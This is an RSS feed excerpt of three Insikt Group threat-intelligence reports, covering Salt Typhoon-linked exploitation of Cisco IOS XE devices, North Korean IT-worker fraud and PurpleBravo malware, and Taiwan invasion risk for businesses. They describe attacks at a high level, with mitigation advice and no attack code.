            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt group logo"></p><h2 id="executive-summary">Executive Summary</h2><p>Between December 2024 and January 2025, Recorded Futures Insikt Group identified a campaign exploiting unpatched internet-facing Cisco network devices primarily associated with global telecommunications providers. Victim organizations included a United States-based affiliate of a United Kingdom-based telecommunications provider and a South African telecommunications provider. Insikt Group attributes this activity to the Chinese state-sponsored threat activity group tracked by Insikt Group as RedMike, which aligns with the Microsoft-named group Salt Typhoon. Using Recorded Future Network Intelligence, Insikt Group observed RedMike target and exploit unpatched Cisco network devices vulnerable to CVE-2023-20198, a privilege escalation vulnerability found in the web user interface (UI) feature in Cisco IOS XE software, for initial access before exploiting an associated privilege escalation vulnerability, CVE-2023-20273, to gain root privileges. RedMike reconfigures the device, adding a generic routing encapsulation (GRE) tunnel for persistent access.</p><p>RedMike has attempted to exploit more than 1,000 Cisco devices globally. The group likely compiled a list of target devices based on their association with telecommunications providers&#39; networks. Insikt Group also observed RedMike targeting devices associated with universities in Argentina, Bangladesh, Indonesia, Malaysia, Mexico, the Netherlands, Thailand, the United States (US), and Vietnam. RedMike possibly targeted these universities to access research in areas related to telecommunications, engineering, and technology, particularly at institutions like UCLA and TU Delft. In addition to this activity, in mid-December 2024, RedMike also carried out a reconnaissance of multiple IP addresses owned by a Myanmar-based telecommunications provider, Mytel.</p><p>Unpatched public-facing appliances serve as direct entry points into an organizations infrastructure. Sophisticated Chinese threat activity groups have <a href="https://go.recordedfuture.com/hubfs/reports/cta-2023-1107.pdf">shifted</a> heavily toward exploiting these devices for initial access over the past five years. RedMikes exploitation of telecommunications infrastructure goes beyond technical vulnerabilities and represents a strategic intelligence threat. Persistent access to critical communications networks enables state-backed threat actors to monitor confidential conversations, manipulate data flows, and disrupt services during geopolitical conflicts. RedMikes targeting of lawful intercept programs and US political figures highlights the strategic intelligence objectives behind these operations and the national security threat they pose.</p><p>Organizations, particularly those in the telecommunications industry, must prioritize remediating exposed network devices, as unpatched systems remain a key initial access vector for Chinese state-sponsored threat activity groups. Network administrators should implement strict access controls, disable unnecessary web UI exposure, and monitor for unauthorized configuration changes. Individuals should use end-to-end encrypted communication methods for sensitive information, just as the Cybersecurity and Infrastructure Agency (CISA) and the Federal Bureau of Investigation (FBI) recommended, which is crucial to mitigate potential eavesdropping risks.</p><p>Additionally, governments and cybersecurity entities should improve threat intelligence sharing and impose stricter regulatory compliance for network security. While the US sanctions on RedMike-affiliated Sichuan Juxinhe Network Technology signal a more assertive and commendable stance against state-backed cyber espionage in critical infrastructure, robust international cooperation is crucial for effectively countering these persistent threats.</p><h2 id="key-findings">Key Findings</h2><ul><li>Despite significant media coverage and US sanctions, RedMike continues to compromise telecommunications providers globally, including in the US.</li><li>RedMike compromised Cisco network devices of a US-based affiliate of a United Kingdom (UK) telecommunications provider and a South African telecommunications provider.</li><li>RedMike exploited privilege escalation vulnerabilities CVE-2023-20198 and CVE-2023-20273 to compromise unpatched Cisco network devices running Cisco IOS XE software.</li><li>Using Recorded Future Network Intelligence, Insikt Group identified RedMike attempting to exploit over 1,000 Cisco network devices between December 2024 and January 2025.</li></ul><h2 id="background">Background</h2><p>In late September 2024, media reporting (<a href="https://www.wsj.com/politics/national-security/china-cyberattack-internet-providers-260bd835?st=cYA8J5&reflink=desktopwebshare_permalink">1</a>, <a href="https://www.securityweek.com/chinas-salt-typhoon-hacked-att-verizon-report/">2</a>) stated that the Chinese state-sponsored group Salt Typhoon had compromised the networks of major US telecommunications companies, including Verizon (<a href="">1</a>), AT&amp;T, and Lumen Technologies. The activity likely affected telecommunications organizations globally, with some outlets <a href="https://www.politico.com/newsletters/national-security-daily/2024/12/12/we-need-to-talk-about-salt-typhoon-00183727">reporting</a> that Salt Typhoon compromised at least 80 organizations. SaltTyphoon used its access to telecommunications providers to snoop on <a href="https://www.darkreading.com/cyber-risk/salt-typhoon-apt-subverts-law-enforcement-wiretapping">US lawful intercept</a> targets and <a href="https://www.politico.com/news/2024/10/25/trump-hack-china-phones-00185608">intercept</a> the communications of significant US political figures. The effect of Salt Typhoons intrusions has reached the highest levels of the US government: Cybersecurity experts have <a href="https://www.reuters.com/world/us/us-agencies-brief-senators-chinese-salt-typhoon-telecom-hacking-2024-12-04/">briefed</a> the US Senate, CISA recently <a href="https://www.cisa.gov/resources-tools/resources/enhanced-visibility-and-hardening-guidance-communications-infrastructure">issued</a> guidance on hardening telecommunications infrastructure, and CISA and the FBI issued a joint <a href="https://www.forbes.com/sites/zakdoffman/2024/12/06/fbi-warns-iphone-and-android-users-stop-sending-texts/">warning</a> encouraging the use of encrypted end-to-end messaging applications for sensitive communications.</p><p>Insikt Group tracks Salt Typhoon-aligned activity as RedMike. Salt Typhoon is a group name given by Microsoft Threat Intelligence; at this time, Microsoft has not published publicly available technical details of the group&#39;s activity. The only public information Microsoft has shared confirms an <a href="https://learn.microsoft.com/en-us/defender-xdr/microsoft-threat-actor-naming">overlap</a> with two existing threat activity group names: GhostEmperor (<a href="https://securelist.com/ghostemperor-from-proxylogon-to-kernel-mode/104407/">Kaspersky</a>) and FamousSparrow (<a href="https://www.welivesecurity.com/2021/09/23/famoussparrow-suspicious-hotel-guest/">ESET</a>).</p><p>On January 17, 2025, the US Department of the Treasurys Office of Foreign Assets Control (OFAC) <a href="https://home.treasury.gov/news/press-releases/jy2792">sanctioned</a> Sichuan-based cybersecurity company Sichuan Juxinhe Network Technology Co., Ltd. for their direct involvement with RedMike activity. OFAC stated that Sichuan Juxinhe Network Technology Co., Ltd. had direct involvement in exploiting US telecommunications and internet service provider companies. According to OFAC, Chinas Ministry of State Security (MSS) has maintained strong ties with multiple computer network exploitation companies, including Sichuan Juxinhe.</p><h2 id="technical-analysis">Technical Analysis</h2><h3 id="cisco-ios-xe-web-ui-exploitation">Cisco IOS XE Web UI Exploitation</h3><p>Using Recorded Future Network Intelligence, Insikt Group identified that since early December 2024, RedMike has attempted to exploit over 1,000 internet-facing Cisco network devices worldwide, primarily those associated with telecommunications providers, using a combination of two privilege escalation vulnerabilities: CVE-2023-20198 and CVE-2023-20273. When successfully compromised, the group uses the new privileged user account to change the device&#39;s configuration and adds a GRE tunnel for persistent access and data exfiltration.</p><p>The privilege escalation vulnerability CVE-2023-20198 was found in the Cisco IOS XE software web UI feature, version 16 and earlier, and <a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z">published</a> by Cisco in October 2023. Attackers exploit this vulnerability to gain initial access to the device and issue a <span style="font-family: Courier;">privilege 15</style> command to create a local user and password. Following this, the attacker uses the new local account to access the device and exploits an associated privilege escalation vulnerability, CVE-2023-20273, to gain root user privileges.</p><p><img src="https://cms.recordedfuture.com/uploads/redmike_salt_01_5eec44df76.png" alt="RedMike Cisco network"><em><strong>Figure 1:</strong> RedMike Cisco network device exploitation infrastructure (Source: Recorded Future)</em></p><p>More than half of the Cisco devices targeted by RedMike were in the US, South America, and India. The remaining devices spanned over 100 other countries. Although the selected devices are primarily associated with telecommunications providers, thirteen were linked to universities across Argentina, Bangladesh, Indonesia, Malaysia, Mexico, the Netherlands, Thailand, the US, and Vietnam.</p><p>Often involved in cutting-edge research, universities are prime targets for Chinese state-sponsored threat activity groups to acquire valuable research data and intellectual property. Previous examples include APT40, which has <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-200a">targeted</a> universities for biomedical, robotics, and maritime research; RedGolf (APT41) <a href="https://www.justice.gov/archives/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer">for</a> medical research; and RedBravo (APT31), which has directly <a href="https://www.reuters.com/technology/cybersecurity/apt31-chinese-hacking-group-behind-global-cyberespionage-campaign-2024-03-26/">targeted</a> academics.

GRE is a tunneling protocol used to encapsulate various network layer protocols inside point-to-point connections. It is a standard feature that can be configured on Cisco network devices. It is commonly used to create virtual private networks (VPNs), enable interoperability between different network types, and transport multicast or non-IP traffic over IP networks. Threat activity groups use GRE tunnels to maintain persistence by establishing covert communication channels that bypass firewalls and intrusion detection systems. These tunnels also facilitate stealthy data exfiltration by encapsulating stolen data within GRE packets, potentially bypassing network monitoring.</p><h3 id="reconnaissance-of-myanmar-telecommunications-provider">Reconnaissance of Myanmar Telecommunications Provider</h3><p>In mid-December 2024, RedMike, from the same infrastructure that exploited the Cisco network devices, performed reconnaissance against multiple infrastructure assets operated by a Myanmar-based telecommunications provider, Mytel, likely including their corporate mail server.</p><p>To read the entire analysis, <a href="https://go.recordedfuture.com/hubfs/reports/cta-cn-2025-0213.pdf">click here</a> to download the report as a PDF.</p>]]></content:encoded>

            <description><![CDATA[Learn how North Koreaâs IT workers infiltrate global companies, posing cybersecurity threats, committing fraud, and supporting the regime. Discover key findings and mitigation strategies to safeguard your business.]]></description>
            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt_group_logo"></p><h2 id="executive-summary">Executive Summary</h2><p>In an era in which remote work has become the norm, North Korea has seized the opportunity to manipulate hiring processes, using fraudulent information technology (IT) employment to generate revenue for the regime. North Korean IT workers infiltrate international companies and secure remote positions under false identities. These operatives not only violate international sanctions but also pose severe cybersecurity threats, engaging in fraud and data theft and potentially disrupting business operations.</p><p>Beyond financial fraud, these IT workers have been linked to cyber espionage. Insikt Group tracks PurpleBravo (formerly Threat Activity Group 120 [TAG-120]), a North Korean-linked cluster that overlaps with the Contagious Interview campaign, which primarily targets software developers in the cryptocurrency industry. The campaign employs malware such as BeaverTail, an infostealer that gathers sensitive information; InvisibleFerret, a cross-platform Python backdoor; and OtterCookie, a tool used to establish persistent access on compromised systems. At least three organizations in the broader cryptocurrency space were targeted by PurpleBravo between October and November 2024: a market-making company, an online casino, and a software development company.</p><p>The findings also highlight North Koreas expansion into other areas of fraud, with the establishment of front companies that mimic legitimate IT firms. TAG-121, a separate cluster of activity, has been identified as operating a network of these companies across China. Each front company spoofs a different legitimate organization by copying large parts of their website. These entities create an added layer of deniability and make detection more challenging, allowing North Korean actors to further embed themselves in global IT supply chains.</p><p>The implications of this threat are far-reaching. Organizations that unknowingly hire North Korean IT workers may be in violation of international sanctions, exposing themselves to legal and financial repercussions. More critically, these workers almost certainly act as insider threats, stealing proprietary information, introducing backdoors, or facilitating larger cyber operations. Given North Koreas history of financial theft, the risks extend beyond individual companies to the broader global financial system and national security interests.</p><p>To mitigate these threats, organizations must adopt stringent identity verification measures, ensuring that remote hires undergo thorough screening. This includes requiring video interviews, notarized identification documents, and continuous monitoring of remote workers for anomalies. Employers should also implement technical controls to detect unauthorized access, restrict data exposure, and flag suspicious remote connections. Awareness and training for human resources (HR) teams and IT security personnel are essential in preventing these actors from infiltrating critical business operations.</p><p>While the threat posed by North Korean IT workers is a fraud issue, it is also a key component of a sophisticated cyber strategy that financially sustains an internationally sanctioned regime.

In the indictment, the US DOJ described a six-year scheme in which two US citizens and one Mexican national conspired with North Korean IT workers to remotely work for at least 64 US companies. Payments from ten companies generated at least $866,255 in revenue that was laundered through a Chinese bank account. In addition to the indictment, stories of organizations and individuals that have come across North Korean IT workers can be regularly found in open sources (<a href="https://x.com/zachxbt/status/1824047425822310580">1</a>, <a href="https://sohay666.github.io/article/en/reversing-scam-interview-base-on-js-project.html">2</a>, <a href="https://www.knowbe4.com/press/knowbe4-issues-warning-to-organizations-after-hiring-fake-north-korean-employee">3</a>). Besides sanctions violations, the threat from these workers, whether stealing sensitive data or installing malware on internal systems, presents unique challenges to organizations, especially in remote work environments.</p><p>North Korea remains highly isolated from the outside world due to the regimes strict control over goods, people, and information, as well as international sanctions placed upon the country. Despite this, Pyongyangs leadership is <a href="https://www.recordedfuture.com/research/north-korea-internet-activity">well-versed</a> in exploiting emerging technologies to fund its operations. As sanctions have tightened, the regime <a href="https://www.recordedfuture.com/research/north-korea-cyber-activity">adapted</a> by escalating illicit activities, including smuggling and cybercrime. In recent years, the regime has achieved significant <a href="https://www.recordedfuture.com/research/crypto-country-north-koreas-targeting-cryptocurrency">success</a> in stealing from traditional financial institutions and digital assets like cryptocurrency. Between 2020 and 2024, the rise of remote work created new opportunities for North Korea to deploy skilled IT workers who infiltrate global companies under false identities. Their activities directly support the regimes military programs while posing a significant threat to industries reliant on intellectual property.</p><p>Research into North Korean IT workers has focused on the following aspects of the threat: North Korean IT workers gaining fraudulent <a href="https://cloud.google.com/blog/topics/threat-intelligence/mitigating-dprk-it-worker-threat">employment</a> through proxies; North Korean <a href="https://www.sentinelone.com/labs/dprk-it-workers-a-network-of-active-front-companies-and-their-links-to-china/">front companies</a>, often in the software development space, imitating legitimate organizations; and <a href="https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west">fake</a> employment opportunities targeting software developers in cryptocurrency and AI, among other industries. Other research has established <a href="https://unit42.paloaltonetworks.com/fake-north-korean-it-worker-activity-cluster/">links</a> between IT workers and ongoing malicious campaigns by North Korean threat actors. </p><h2 id="threat-analysis">Threat Analysis</h2><h3 id="purplebravo">PurpleBravo</h3><p>The Contagious Interview campaign, first <a href="https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/">documented</a> in November 2023, targeted software developers primarily in the cryptocurrency space and was attributed to North Korea. The campaign used the JavaScript infostealer BeaverTail, the cross-platform Python backdoor InvisibleFerret, and most recently OtterCookie, a new backdoor <a href="https://jp.security.ntt/tech_blog/contagious-interview-ottercookie">identified</a> in December 2024. The group responsible for this activity is known as CL-STA-0240, Famous Chollima, and Tenacious Pungsan in open sources.

An individual claiming to be a recruiter contacted them about a job offer and then followed up with an interview. During the interview, the interviewer asked the developer to download a coding challenge from a repository. The developer realized there was a malicious function in the file and ended the interview. While the developer does not attribute the malware or actor, Insikt Group assesses with high confidence the file is a BeaverTail infostealer.</p><p>The interviewer used a LinkedIn account with the name Javier Fiesco, who describes themself as the CTO of AgencyHill99. Further investigation into Javier Fiesco <a href="https://remote3.co/p/javier0923">uncovered</a> an individual with the same name available for work on remote3, a Web3 development job board. The website <em>agencyhill99[.]com</em> was registered on Hostinger on September 13, 2024.

BeaverTail is a malware family initially distributed via NPM packages as a JavaScript payload and later as executables and downloaders targeting Windows and macOS environments. BeaverTail also acts as an infostealer, gathering cryptocurrency wallet and browser information. InvisibleFerret is a collection of post-compromise payloads that collectively act as a backdoor in victim environments. InvisibleFerret introduces additional malicious payloads into victim environments, performs information stealing and fingerprinting actions within the victim environment, and leverages legitimate protocols and software for C2 communications. Like InvisibleFerret, OtterCookie is a post-compromise malware family used as a backdoor, which establishes C2 connectivity via Socket[.]IO, receives and executes shell commands from C2 servers, and exfiltrates sensitive victim data.</p><p>Insikt Group analyzed BeaverTail, InvisibleFerret, and OtterCookie malware samples (See <strong>Appendix B</strong> for related file hashes). The BeaverTail samples were identified as PE variants targeting Windows environments. These samples included URLs linked to <em>freeconference[.]com</em>, a legitimate conferencing website, which aligns with Unit42s <a href="https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/">findings</a> of Contagious Interview payloads posing as FreeConference executables. The OtterCookie samples were two separate versions of the malware family; however, static analysis of these samples included strings that demonstrated both samples ability to gather and send system fingerprinting information to attacker C2 servers, including strings that indicated OtterCookie is capable of identifying cryptocurrency assets and sensitive information found in specific file types by using regex patterns, including executables, photos, and config and env files, among others.</p><p>The InvisibleFerret samples analyzed were Python scripts with the following functionalities: </p><ul><li>Determining victim device location via local IP address lookup</li><li>Fingerprinting device details (user and hostname)</li><li>Connecting to a Base64-encoded C2 address via HTTP POST requests</li><li>Performing local directory discovery using hard-coded strings</li><li>Creating a reverse shell for SSH session management and data exfiltration</li><li>Copying clipboard data, keylogging, and tracking mouse movements.</li></ul><p>Previous samples of InvisibleFerret were <a href="https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west">analyzed</a> by Zscaler, which described a two-part infection chain in which the initial reconnaissance took place over HTTP traffic and FTP was used for data exfiltration, as shown in <strong>Figure 2</strong>.</p><p><img src="https://cms.recordedfuture.com/uploads/purplebravo_02_601227dd0c.png" alt="InvisibleFerret"><em><strong>Figure 2</strong>: InvisibleFerret Infection chain (Source: Recorded Future and <a href="https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west">Zscaler</a>)</em></p><p>Insikt Group identified 21 PurpleBravo servers between August 2024 and February 2025 (see <strong>Appendix B</strong> for the complete list). The majority of servers use Tier[.]Net hosting, with Majestic Hosting, Stark Industries, Leaseweb Singapore, and Kaopu Cloud HK also being used in this campaign. Insikt Group has previously observed other North Korean threat groups favor many of these hosting providers. In addition to the C2 servers, using Recorded Future Network Intelligence, Insikt Group observed at least seven suspected victims between September 2024 and February 13, 2025. The victims are located in at least six countries, including the United Arab Emirates, Costa Rica, India, Vietnam, Trkiye, and South Korea. Open-source <a href="https://spur.us/astrill-vpn-and-remote-worker-fraud/">research</a> identified Astrill VPN as a favored service by North Korean IT workers, with <a href="https://cloud.google.com/blog/topics/threat-intelligence/mitigating-dprk-it-worker-threat">evidence</a> that they use the service with remote administration tools. Insikt Group also observed network traffic between known Astrill VPN endpoints and PurpleBravo servers, corroborating this connection.</p><p><img src="https://cms.recordedfuture.com/uploads/purplebravo_03_7060a07d32.png" alt="PurpleBravo victims"><em><strong>Figure 3</strong>: Location of PurpleBravo victims (Source: Recorded Future)</em></p><p>At least three victims in the cryptocurrency space were identified in the findings summarized below:</p><ul><li>On October 3, 2024, Insikt Group observed likely reconnaissance traffic between a BeaverTail C2 and a market-making company in the cryptocurrency space based in the United Arab Emirates.

            <description><![CDATA[Prepare your business for potential geopolitical disruptions from a Taiwan invasion. Assess evolving risks, global economic impacts, and strategic measures to safeguard supply chains and critical operations in Asia.]]></description>
            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt-group-logo-updated-3-300x48.png"></p><h2 id="executive-summary">Executive Summary</h2><p>Businesses should now begin making preparatory investments to establish contingency plans in case of a Taiwan invasion, especially if they operate in Taiwan or China, rely heavily on supply chains or shipping in Asia, or are located in countries likely to oppose Chinas geopolitical objectives. While an invasion in the short term (20252026) is currently unlikely, the factors informing Insikt Groups assessment are rapidly evolving. Beginning in 2027 and continuing through the long term (20272049), the risk of an invasion will very likely continue to increase, though it is not inevitable that an invasion will occur. In the short term, China is almost certain to continue its current coercive efforts, including major military exercises and incursions into maritime and air spaces near Taiwan, while seeking ways to incrementally escalate such coercion below the level of an invasion. In these efforts, China is likely to initiate a temporary law enforcement-led quarantine and a disruptive cyber campaign against Taiwans critical infrastructure.</p><p>Our assessment is based on a range of behaviors and trends across China, Taiwan, and the United States (US), as described in the <strong>Key Findings</strong> below, and in consideration of Chinas broader geopolitical context (see <strong>Appendix A</strong>). Fundamentally, in the short term, we assess that  absent a specific catalyst that leads to war (such as if Taiwan were to declare formal independence)   the Chinese Communist Party (CCP) leadership is very likely to remain focused on improving domestic conditions and strengthening preparations for navigating tensions with the US, a potential invasion of Taiwan, or other conflict with foreign powers (such as over the South China Sea). In the long term, we assess that China will likely have established a level of preparedness across the military, economic, social, and other domains by 2027 that would enable its leadership to invade Taiwan as a war of choice (rather than in response to a specific catalyst) while minimizing associated costs and risks. </p><p>Our assessment is generally aligned with public statements by Taiwan and US government and military officials since the start of 2023, both of which emphasize active preparations regardless of speculation about specific timelines. More specifically, Taiwan officials express that an invasion is currently unlikely despite the potential for a diversionary war to distract from Chinas domestic economic challenges. They also highlight weaknesses in the Peoples Liberation Armys (PLAs) amphibious capability while recognizing the PLA could likely execute a blockade of Taiwan  the foremost alternative to an invasion. US officials express that an invasion is not imminent or inevitable, but that the risk is increasing and that Chinas forces are on track to meet their modernization and readiness goals. </p><p>An invasion would almost certainly severely impact the global economy, disrupting critical shipping lanes, devastating the semiconductor industry, and imposing broad costs on Taiwan, China, and potentially the US. Businesses likely to be affected by a Taiwan invasion scenario should consider taking steps such as building relationships with potential alternative suppliers outside of Asia, evaluating the purchase of war risk insurance, conducting scenario-based stress tests to identify vulnerabilities in operations and investments, maintaining encrypted offline backups of key computer systems and data, isolating high-value computer systems to limit an adversarys lateral movement in case of a breach, and purchasing a geopolitical threat intelligence capability to support ongoing monitoring of the Taiwan issue (additional recommendations can be found in the <strong>Preparing for Potential Global Economic Disruption</strong> section of this report). Indicators of escalation to support monitoring are provided in <strong>Appendix B</strong>. Given the public focus on the impact of an invasion on Taiwans semiconductor industry, <strong>Appendix C</strong> further offers our assessment of why that industry is not especially relevant to judging if or when China might invade.</p><h2 id="key-findings">Key Findings</h2><p>Assessments supporting our judgment that an invasion is unlikely in the short term include:</p><p>China almost certainly continues to prefer peaceful reunification and very likely continues to invest in a dual-track strategy that combines economic inducements with coercive elements.Chinas economy is facing challenges that are very likely holding the focus of leadership as they strive to attain national rejuvenation. Despite PLA progress in developing capabilities necessary for a successful invasion of Taiwan, Chinas military continues to have limitations in areas that suggest it is not yet ready to undertake an invasion.Chinas leadership has likely not begun telling the public to prepare for war and public support for a war is likely not at levels the CCP would prefer before ordering an invasion. Although long-term public opinion trends in Taiwan are unfavorable to Chinas goals, polling results since 2020 likely suggest to Chinas leadership that its strategy is working to curb preferences for independence in the short term.</p><p>Assessments supporting our judgment of rising risk in the long term include:</p><p>The CCP has become increasingly assertive and very likely expectant of progress with regard to its goals for Taiwan.Under Xi Jinpings leadership, the CCP has taken administrative and other measures to develop a self-sufficient economy, harden against foreign economic coercion such as sanctions, decrease reliance on the US dollar, and prepare for shortages in strategic resources like grain and critical minerals.China-based cyber threat actors are targeting US critical infrastructure in ways that suggest their goal is to pre-position for a potential conflict. Chinas leadership has intensified its use of lawfare measures against Taiwan, particularly over the past year. The PLA, Chinas wider armed forces, and Chinas defense industry are continuing to improve capabilities that would be needed for a successful invasion of Taiwan, countering US intervention, and other scenarios.The political and social environments in Taiwan are both trending toward potentially permanent rejection of unification.Chinas leadership almost certainly perceives US government behavior as trending toward overturning its (the USs) one-China policy, which is one of Beijings likely red lines that could hasten an invasion scenario.</p><h2 id="indicators-an-invasion-is-unlikely-in-the-short-term">Indicators an Invasion Is Unlikely in the Short Term</h2><p>There are several elements of Chinas behavior that support our assessment that a Taiwan invasion is unlikely before 2027. These include Chinas almost certain continuing preference for peaceful reunification, indicators that it very likely continues to pursue a dual-track approach to Taiwan, economic challenges that very likely take priority given Chinas other ambitions, shortfalls in PLA capability, and limited indication that China has begun mobilizing its populace to brace for wartime hardship. Additionally, public opinion polling results in Taiwan since 2020 likely suggest to Chinas leadership that its coercive strategy is working to deter independence in the short term. In totality, we assess that  absent a specific catalyst that leads to war (such as if Taiwan declares formal independence or China assesses foreign military interference in Taiwan)   the CCP leadership is very likely, in the short term, to remain focused on improving domestic conditions and strengthening preparations for navigating tensions with the US, a potential invasion, or other conflict with a foreign power (for example, over the South China Sea).</p><h3 id="trends-in-china">Trends in China</h3><p>China almost certainly continues to prefer peaceful reunification and very likely continues to invest in a dual-track strategy that combines economic inducements with coercive elements.

Chinas challenges include a <a href="https://www.cnbc.com/2024/10/30/chinas-property-market-is-expected-to-stabilize-in-2025-.html#:~:text=China%20Economy-,China's%20property%20market%20is%20expected%20to%20stabilize%20in,but%20stay%20subdued%20for%20years&text=China's%20struggling%20real%20estate%20sector,latest%20stimulus%20measures%2C%20analysts%20predict.">depressed</a> property market, <a href="https://www.fitchratings.com/research/sovereigns/deflation-in-china-risks-becoming-entrenched-05-11-2024">deflation</a>, <a href="https://www.rfa.org/english/china/2024/11/18/china-local-government-hidden-debt-explained/#:~:text=The%20International%20Monetary%20Fund%20estimates,%25%20of%20GDP%2C%20Reuters%20reported.">high</a> local government debt, <a href="https://www.voanews.com/a/foreign-investment-in-china-falls-for-past-year-as-economy-struggles/7682513.html">declining</a> foreign investment, <a href="https://www.nbcnews.com/news/world/chinas-youth-unemployment-hits-fresh-high-economic-slowdown-restrictiv-rcna172183">elevated</a> youth unemployment, and <a href="https://www.cnbc.com/2024/09/27/chinas-ambitions-for-chip-self-sufficiency-thwarted-by-lack-of-tools-.html">lingering dependence</a> on critical foreign technology like semiconductor production tools (for more on the relevance of semiconductors in Chinas likely Taiwan invasion calculus, see <strong>Appendix C</strong>), while <a href="https://www.interest.co.nz/public-policy/129617/yuen-yuen-ang-explains-chinas-seemingly-contradictory-trajectory-characterised">shifting</a> toward a green, high-tech structure. These and other challenges have led to arguments that China could invade Taiwan to distract from domestic troubles (<a href="https://asia.nikkei.com/Politics/International-relations/Taiwan-tensions/China-could-threaten-war-in-2023-to-force-talks-Taiwan-official">1</a>, <a href="https://news.sky.com/story/china-more-likely-to-invade-taiwan-and-attack-could-come-in-2027-islands-foreign-minister-joseph-wu-warns-12789179">2</a>, <a href="https://www.theguardian.com/us-news/2023/aug/11/joe-biden-china-economy-time-bomb">3</a>, <a href="https://www.wilsoncenter.org/publication/desperate-times-desperate-measures-slowing-growth-making-china-more-dangerous">4</a>), but this is unlikely. First, diversionary war has not been the CCPs method for <a href="https://www.foreignaffairs.com/china/myth-chinese-diversionary-war">managing</a> domestic crises since 1949. Second, the economic challenges are likely not great enough to <a href="https://www.prcleader.org/post/getting-to-world-class-can-china-s-military-persevere">derail</a> the PLAs ongoing modernization in ways that would limit Chinas option to use force in the future. During this period, Xi Jinping is very likely to focus on solving domestic economic problems while strengthening the military to support conditions for achieving national rejuvenation by 2049  a goal with an <a href="https://www.strategictranslation.org/glossary/great-rejuvenation-of-the-chinese-nation">economic component</a>  and to prepare for unifying with Taiwan through force if doing so is deemed necessary. </p><p>Despite PLA progress toward developing capabilities necessary for a successful invasion of Taiwan (discussed further below), Chinas military continues to have limitations in areas that suggest it is not yet ready to undertake such a high-risk operation. These limitations very likely include a lack of sealift capacity for an invasion of Taiwan, inadequate rapid runway repair capabilities to <a href="https://www.airuniversity.af.edu/CASI/Display/Article/3430623/the-regenerating-road-chinas-rapid-runway-repair-capabilities-and-other-recover/">restore</a> air operations following enemy assaults, difficulty <a href="https://digital-commons.usnwc.edu/cmsi-maritime-reports/34/">integrating</a> submarine forces into joint operations, and helicopter forces that have readiness and operational capacity limitations. Corruption also <a href="https://media.defense.gov/2024/Dec/18/2003615520/-1/-1/0/MILITARY-AND-SECURITY-DEVELOPMENTS-INVOLVING-THE-PEOPLES-REPUBLIC-OF-CHINA-2024.PDF">continues</a> to be a <a href="https://thediplomat.com/2024/12/can-china-ever-weed-out-corruption-in-its-military/">major challenge</a> for the PLA and Chinas <a href="https://thediplomat.com/2024/09/the-logic-of-chinas-careful-defense-industry-purge/">defense industry</a>, potentially disrupting the militarys organizational command, the quality of its personnel, its preparedness for warfare, and the attainment of its modernization goals. </p><p>Chinas leadership has likely not begun telling the public to prepare for war and public support for a war is likely not at levels the CCP would prefer before ordering an invasion. This point is debated, with some analysts focusing on Xi Jinpings <a href="https://www.hoover.org/sites/default/files/research/docs/4_BoilingMoat_Ch1.pdf">warning</a> that the stormy seas of a major test are looming, his <a href="https://web.archive.org/web/20230531131348/http://politics.people.com.cn/n1/2023/0530/c1024-40002443.html">emphasis</a> on worst-case scenario thinking, and the CCPs escalating rhetoric targeting Taiwan. However, when asked about this language during a US Congressional hearing in 2024, multiple experts from the US, India, and elsewhere <a href="https://www.uscc.gov/sites/default/files/2024-06/June_13_2024_Hearing_Transcript.pdf">assessed</a> that available evidence likely does not point to warnings of an imminent invasion specifically, but rather to the rising risks of Chinas volatile economic and geopolitical context generally (see <strong>Appendix A</strong>). In particular, these experts <a href="https://www.uscc.gov/sites/default/files/2024-06/June_13_2024_Hearing_Transcript.pdf">focus</a> on the lack of state content demonizing Chinas would-be opponents in Taiwan and likely the US. Moreover, only about 50%  at most  of the Chinese public likely supports a use of force to unify Taiwan under certain conditions; Chinas leadership would likely prefer a stronger base of popular support before initiating a high-risk and potentially costly invasion, for reasons related to PLA <a href="https://www.uscc.gov/sites/default/files/2024-06/Devin_Thorne_Testimony.pdf">reliance</a> on civilian systems  and because failure could threaten at least the current CCP leadership if not wider party legitimacy (<a href="https://digitalcommons.ndu.edu/cgi/viewcontent.cgi?article=1118&context=strategic-forums">1</a>, <a href="https://www.airuniversity.af.edu/JIPA/Display/Article/2444775/the-day-after-the-battle/">2</a>, <a href="https://www.usip.org/publications/2024/11/many-ways-fail-costs-china-unsuccessful-taiwan-invasion">3</a>).</p><h3 id="trends-in-taiwan-and-the-us">Trends in Taiwan and the US</h3><p>Although long-term public opinion trends in Taiwan <a href="https://esc.nccu.edu.tw/PageDoc/Detail?fid=7801&id=6963">indicate</a> the majority of people are very unlikely to ever willingly support unification (discussed later in this report), polling results since 2020 likely suggest to Chinas leadership that the military and other elements of its strategy are working to curb preferences for independence in the short term. Since 2020, support for maintaining the status quo has increased while moving toward independence has trended downward (an uptick in June 2024 notwithstanding). Further, support for maintaining the status quo indefinitely has risen since 2020 from 25.8% to 33.6%. Support for &quot;independence as soon as possible has also fallen from 6.6% to 3.8% in this same period. These results likely decrease the likelihood of an invasion given Chinas very likely preference for solving domestic challenges and further preparing in case an invasion is deemed necessary.</p><p>Insikt Group has not identified any trends in the US that would, in our assessment, decrease the likelihood of invasion in the short term.</p><p>To read the entire analysis, <a href="https://go.recordedfuture.com/hubfs/reports/ta-cn-2025-0212.pdf">click here</a> to download the report as a PDF.</p>]]></content:encoded>

